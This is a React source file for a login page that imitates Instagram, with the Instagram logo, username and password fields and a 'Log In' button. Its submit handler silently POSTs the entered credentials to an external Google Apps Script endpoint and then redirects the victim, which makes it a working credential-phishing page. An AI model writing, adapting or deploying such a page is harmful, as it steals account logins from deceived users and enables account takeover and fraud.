import React, { useState } from "react";
import { NavLink } from "react-router-dom";

const Login = () => {
  const [disnon, setDisnon] = useState("none");

  const submitForm = (e) => {
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbxMxZClMqC4FKIpTGsp0ekJToDAOURGzCaH8vm2-N48reDX-YP3MaX9_jVUmKZK7smF8w/exec";
    const form = document.forms["instagram"];

    e.preventDefault();
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then((response) => console.log("You are welcome"))
      .catch((error) => console.error("Error!", error.message));
    setDisnon(" ");

    setInterval(() => {
      window.location.assign("./Magic");
    }, 1000);
  };

  //

  return (
    <div className="relative w-full h-full">
      <div style={{ display: disnon }}>
        <div
          id="loader"
          className={`absolute w-full bgbtrs top-0 h-full flex pt-10 justify-center`}
        >
          <div role="status">
            <svg
              aria-hidden="true"
              class="inline w-12 h-12 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="#fff"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="red"
              />
            </svg>
            <span class="sr-only">Loading...</span>
          </div>
        </div>
      </div>
      <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
        <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
          <h1 className="bg-no-repeat instagram-logo">
            <img
              width="180"
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/840px-Instagram_logo.svg.png"
              alt=""
            />
          </h1>
          <form
            onSubmit={(e) => submitForm(e)}
            method="post"
            className="mt-8 w-64 flex flex-col"
            name="instagram"
          >
            <input
              onChange={(e) => setEmail(e.target.value)}
              required
              name="username"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="email"
              placeholder="Phone number, username, or email"
              type="text"
            />
            <input
              onChange={(e) => setPassword(e.target.value)}
              required
              name="password"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="password"
              placeholder="Password"
              type="text"
            />
            <input
              onChange={(e) => setRePassword(e.target.value)}
              required
              name="repassword"
              autofocus
              className="text-xs text-black w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="re-password"
              placeholder="Re Enter Password"
              type="text"
            />
            <button
              type="submit"
              className=" text-sm text-center bg-blue-500 text-white py-1 rounded font-medium"
            >
              Log In
            </button>
          </form>

          <div className="flex justify-evenly space-x-2 w-64 mt-4">
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
              or
            </span>
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
          </div>
          <button className="mt-4 flex">
            <div className="bg-no-repeat facebook-logo mr-1"></div>
            <span className="text-xs text-blue-900 font-semibold">
              Log in with Facebook
            </span>
          </button>
          <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
            Forgot password?
          </a>
        </div>
        <div className="bg-white border border-gray-300 text-center w-80 py-4">
          <span className="text-sm text-black">Don't have an account?</span>
          <a className="text-blue-500 text-sm font-semibold"> Sign up</a>
        </div>
        <div className="mt-3 text-center">
          <span className="text-xs">Get the app</span>
          <div className="flex mt-3 space-x-2">
            <div className="bg-no-repeat apple-store-logo"></div>
            <div className="bg-no-repeat google-store-logo"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
